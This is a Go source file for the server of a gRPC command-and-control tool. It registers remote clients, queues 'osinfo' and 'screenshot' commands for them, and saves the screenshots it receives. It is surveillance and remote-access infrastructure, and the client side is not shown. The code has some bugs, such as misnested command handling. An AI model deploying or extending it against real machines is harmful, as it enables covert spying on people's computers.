package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	pb "github.com/NukeDev/Goolia/proto"

	"google.golang.org/grpc"
)

type server struct{}
type CommandLine struct{}
type OSInfo struct {
	Family       string
	Architecture string
	ID           string
	Name         string
	Codename     string
	Version      string
	Build        string
}
type Shots struct {
	ShotTime time.Time
	Data     []byte
}
type Client struct {
	ID       string
	ClientIP string
	LastPing time.Time
}

var Clients = map[string]Client{}
var Command = map[string]string{}

func (s server) HandleCommands(srv pb.Com_HandleCommandsServer) error {

	ctx := srv.Context()
	log.Printf("Client connected")
	for {

		// exit if context is done
		// or continue
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		// receive data from stream
		req, err := srv.Recv()

		if err == io.EOF {
			// return will close stream from server side
			log.Println("EOF")
			return nil
		}
		if err != nil {
			log.Printf("receive error %v", err)
			continue
		}

		// continue if number reveived from stream
		// less than max

		cl := Client{
			ID:       req.ClientID,
			ClientIP: req.ClientIPAddress,
			LastPing: time.Now(),
		}

		switch req.Command {
		case "ping":
			{

				Clients[cl.ID] = cl

				customCmd := Command[cl.ID]

				if customCmd != "" {
					resp := pb.Response{ClientID: cl.ID, ClientIPAddress: cl.ClientIP, Command: customCmd, Data: nil}
					delete(Command, cl.ID)
					if err := srv.Send(&resp); err != nil {
						log.Printf("OSINFO: error %v", err)
					}
				} else {
					resp := pb.Response{ClientID: cl.ID, ClientIPAddress: cl.ClientIP, Command: "ping", Data: nil}

					if err := srv.Send(&resp); err != nil {
						log.Printf("PING: error %v", err)
					}
				}

			}
		case "osinfo":
			{
				var osinfo OSInfo

				err := json.Unmarshal(req.Data, &osinfo)

				if err != nil {
					log.Fatalf("%v", err)
				}

				log.Println("-------------------")
				log.Printf("OSINFO - Client ID %s\n", req.ClientID)
				log.Println("-------------------")
				log.Println("Family: " + osinfo.Family)
				log.Println("Architecture: " + osinfo.Architecture)
				log.Println("ID: " + osinfo.ID)
				log.Println("Name: " + osinfo.Name)
				log.Println("Codename: " + osinfo.Codename)
				log.Println("Version: " + osinfo.Version)
				log.Println("Build: " + osinfo.Build)
				log.Println("-------------------")

			}
		case "screenshot":
			{
				var shots []Shots

				err := json.Unmarshal(req.Data, &shots)

				if err != nil {
					log.Fatalf("%v", err)
				}

				for shot := range shots {

					ioutil.WriteFile(string(time.Now().Unix())+".png", shots[shot].Data, 0777)
				}

			}
		default:
			{
				resp := pb.Response{ClientID: req.ClientID, ClientIPAddress: req.ClientIPAddress, Command: "not-found", Data: nil}
				if err := srv.Send(&resp); err != nil {
					log.Printf("Command Not-Found error %v", err)
				}
				log.Printf("Sent command not found to client id=%s", req.ClientID)
			}
		}

	}
}

func main() {
	// create listiner
	go func() {
		lis, err := net.Listen("tcp", ":50005")
		if err != nil {
			log.Fatalf("failed to listen: %v", err)
		}
		// create grpc server
		s := grpc.NewServer()
		pb.RegisterComServer(s, server{})

		// and start...
		if err := s.Serve(lis); err != nil {
			log.Fatalf("failed to serve: %v", err)
		}
	}()

	cmd := CommandLine{}
	cmd.Run()

}

func (cli *CommandLine) printUsage() {
	fmt.Println("Usage: ")
	fmt.Println("clients - [Gets connected clients]")
	fmt.Println("osinfo <clientid> - [Gets OSINFO of specified client]")
}

func (cli *CommandLine) validateArgs(data []string) {
	if len(data) < 1 {
		cli.printUsage()
	}
}

func (cli *CommandLine) getClients() {

	localIds := GenerateClientsIds(Clients)

	for id := range localIds {
		now := time.Now()
		lastContact := now.Sub(Clients[localIds[id]].LastPing)
		log.Printf("[%v] Client ID: %s - IP: %s - Last Contact: %s ago", id, localIds[id], Clients[localIds[id]].ClientIP, lastContact)

	}
}

func (cli *CommandLine) Run() {

	for {

		input := bufio.NewScanner(os.Stdin)
		input.Scan()
		data := strings.Fields(input.Text())
		cli.validateArgs(data)

		clients := flag.NewFlagSet("clients", flag.ExitOnError)
		osinfo := flag.NewFlagSet("osinfo", flag.ExitOnError)
		screenshot := flag.NewFlagSet("screenshot", flag.ExitOnError)
		clientosinfo := osinfo.String("clientid", "", "Gets OSINFO of specified client")
		clientscreenshot := screenshot.String("clientid", "", "Gets Screenshots of specified client")
		switch data[0] {
		case "clients":
			err := clients.Parse(data[1:])
			if err != nil {
				log.Panic(err)
			}
		case "osinfo":
			err := osinfo.Parse(data[1:])
			if err != nil {
				log.Panic(err)
			}
		case "screenshot":
			err := screenshot.Parse(data[1:])
			if err != nil {
				log.Panic(err)
			}
		default:
			cli.printUsage()
		}

		if clients.Parsed() {

			cli.getClients()
		}

		if osinfo.Parsed() {
			if *clientosinfo == "" {
				osinfo.Usage()
			} else {

				if id, err := strconv.Atoi(*clientosinfo); err == nil {
					localIds := GenerateClientsIds(Clients)
					if Clients[localIds[id]].ID != "" {
						if Command[Clients[localIds[id]].ID] == "osinfo" {
							log.Println("WARING: osinfo request already sent to client... Please wait a response!")
						} else {
							log.Println("INFO: osinfo request sent to client... Please wait a response!")
							Command[Clients[localIds[id]].ID] = "osinfo"
						}
					} else {
						log.Println("ERROR: Invalid Client ID!")
					}

				} else {

					if Clients[*clientosinfo].ID != "" {
						if Command[*clientosinfo] == "osinfo" {
							log.Println("WARING: osinfo request already sent to client... Please wait a response!")
						} else {
							log.Println("INFO: osinfo request sent to client... Please wait a response!")
							Command[*clientosinfo] = "osinfo"
						}
					} else {
						log.Println("ERROR: Invalid Client ID!")
					}

				}

			}
			if screenshot.Parsed() {
				if *clientscreenshot == "" {
					screenshot.Usage()
				} else {

					if id, err := strconv.Atoi(*clientscreenshot); err == nil {
						localIds := GenerateClientsIds(Clients)
						if Clients[localIds[id]].ID != "" {
							if Command[Clients[localIds[id]].ID] == "screenshot" {
								log.Println("WARING: screenshot request already sent to client... Please wait a response!")
							} else {
								log.Println("INFO: screenshot request sent to client... Please wait a response!")
								Command[Clients[localIds[id]].ID] = "screenshot"
							}
						} else {
							log.Println("ERROR: Invalid Client ID!")
						}

					} else {

						if Clients[*clientscreenshot].ID != "" {
							if Command[*clientscreenshot] == "screenshot" {
								log.Println("WARING: screenshot request already sent to client... Please wait a response!")
							} else {
								log.Println("INFO: screenshot request sent to client... Please wait a response!")
								Command[*clientscreenshot] = "screenshot"
							}
						} else {
							log.Println("ERROR: Invalid Client ID!")
						}

					}
				}
			}

		}
	}

}

//GenerateClientsIds returns clients mapped as int
func GenerateClientsIds(clients map[string]Client) map[int]string {
	localID := 0
	localIDMap := map[int]string{}
	for k := range clients {
		localID++
		localIDMap[localID] = k
	}
	return localIDMap
}
